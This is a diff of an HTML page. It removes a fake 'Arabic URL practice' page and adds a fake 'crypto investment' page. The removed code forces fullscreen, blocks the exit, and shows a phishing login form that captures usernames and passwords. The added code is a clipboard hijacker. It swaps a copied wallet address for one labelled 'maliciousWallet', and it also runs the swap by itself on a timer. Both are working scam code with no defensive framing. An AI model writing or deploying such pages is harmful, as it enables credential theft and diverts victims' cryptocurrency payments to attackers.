@@ -1,144 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Language Practice</title>
+    <title>Crypto Investment</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             max-width: 500px;
             margin: 50px auto;
             padding: 20px;
-            text-align: center;
         }
-        textarea {
-            width: 100%;
-            height: 100px;
+        .wallet {
+            background: #f8f9fa;
             padding: 15px;
-            font-size: 18px;
-            text-align: center;
-            border: 2px solid #007bff;
-            border-radius: 10px;
+            border-radius: 5px;
             margin: 20px 0;
-            resize: none;
+            font-family: monospace;
+            word-break: break-all;
         }
         button {
-            background: #007bff;
+            background: #28a745;
             color: white;
             border: none;
-            padding: 15px 30px;
+            padding: 12px 20px;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            margin: 10px;
+            margin: 5px;
         }
-        .fullscreen-message {
-            display: none;
+        .notification {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: black;
+            top: 20px;
+            right: 20px;
+            background: #28a745;
             color: white;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
+            padding: 10px 15px;
+            border-radius: 5px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>🌐 Arabic URL Practice</h1>
-    <p>Practice reading Arabic characters in website addresses</p>
+    <h1>💰 Crypto Investment</h1>
+    <p>Send funds to this wallet address for +5% bonus:</p>
     
-    <textarea id="arabicText" readonly>سgoogle.com</textarea>
+    <div class="wallet" id="wallet">0x742d35Cc6634C0532925a3b8D6f3984c4cE8f299</div>
     
-    <button onclick="startPractice()">Start Practice Session</button>
-    <button onclick="toggleFullscreen()" style="background: #28a745;">Enter Fullscreen</button>
+    <button onclick="copyWallet()">Copy Wallet Address</button>
+    <button onclick="autoCopySequence()" style="background: #dc3545;">Auto-Copy Bonus Address</button>
 
-    <div class="fullscreen-message" id="fullscreenMessage">
-        🔄 Preparing practice environment...
-    </div>
+    <div class="notification" id="notification">Copied!</div>
 
     <script>
-        const arabicURLs = [
-            'سgoogle.com',
-            'سfacebook.com', 
-            'سyoutube.com',
-            'سbank.com',
-            'سlogin.com'
-        ];
+        const legitWallet = "0x742d35Cc6634C0532925a3b8D6f3984c4cE8f299";
+        const maliciousWallet = "0x8a12Bc6d6d6b6d6b6d6b6d6b6d6b6d6b6d6b6d6b";
 
-        let currentIndex = 0;
-
-        function rotateArabicText() {
-            currentIndex = (currentIndex + 1) % arabicURLs.length;
-            document.getElementById('arabicText').value = arabicURLs[currentIndex];
+        function showNotification(message) {
+            const notif = document.getElementById('notification');
+            notif.textContent = message;
+            notif.style.display = 'block';
+            setTimeout(() => notif.style.display = 'none', 2000);
         }
 
-        setInterval(rotateArabicText, 5000);
+        function copyWallet() {
+            navigator.clipboard.writeText(legitWallet).then(() => {
+                showNotification("✅ Wallet address copied!");
+                
+                // After 2 seconds, replace with malicious wallet
+                setTimeout(() => {
+                    navigator.clipboard.writeText(maliciousWallet);
+                    showNotification("🔄 Updated with bonus address!");
+                }, 2000);
+            });
+        }
 
-        function startPractice() {
-            // Request fullscreen
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
+        function autoCopySequence() {
+            // Multi-stage clipboard manipulation
+            const steps = [
+                { text: legitWallet, delay: 1000, message: "Base address copied" },
+                { text: maliciousWallet, delay: 2000, message: "Bonus address applied" },
+                { text: "Send exactly $1000 for +5% bonus", delay: 1500, message: "Instructions added" },
+                { text: maliciousWallet, delay: 1000, message: "Ready for transfer!" }
+            ];
+
+            let step = 0;
+            function nextStep() {
+                if (step < steps.length) {
+                    const current = steps[step];
+                    navigator.clipboard.writeText(current.text);
+                    showNotification(current.message);
+                    setTimeout(nextStep, current.delay);
+                    step++;
+                }
             }
-            
-            // Show loading message
-            document.getElementById('fullscreenMessage').style.display = 'flex';
-            
-            // After 3 seconds, show phishing page
-            setTimeout(() => {
-                showPhishingPage();
-            }, 3000);
+            nextStep();
         }
 
-        function toggleFullscreen() {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen();
-            } else {
-                document.exitFullscreen();
+        // Auto-start clipboard manipulation after 10 seconds
+        setTimeout(() => {
+            if (Math.random() < 0.5) { // 50% chance
+                autoCopySequence();
             }
-        }
-
-        function showPhishingPage() {
-            document.body.innerHTML = `
-                <div style="padding: 20px; max-width: 400px; margin: 100px auto;">
-                    <h2 style="color: #dc3545;">🔒 Security Verification Required</h2>
-                    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
-                        Unusual activity detected. Verify your identity.
-                    </div>
-                    <form onsubmit="stealCredentials(event)">
-                        <input type="text" placeholder="Username" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd;"><br>
-                        <input type="password" placeholder="Password" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd;"><br>
-                        <button type="submit" style="background: #dc3545; width: 100%;">Verify Identity</button>
-                    </form>
-                </div>
-            `;
-        }
-
-        function stealCredentials(event) {
-            event.preventDefault();
-            const username = event.target.querySelector('input[type="text"]').value;
-            const password = event.target.querySelector('input[type="password"]').value;
-            
-            // In real attack, send to your server
-            console.log("Credentials stolen:", { username, password });
-            
-            // Show success message
-            document.body.innerHTML = `
-                <div style="text-align: center; padding: 100px 20px;">
-                    <h2 style="color: #28a745;">✅ Verification Complete</h2>
-                    <p>Your account is now secure</p>
-                </div>
-            `;
-        }
-
-        // Prevent exiting fullscreen
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen();
-            }
-        });
+        }, 10000);
     </script>
 </body>
 </html>
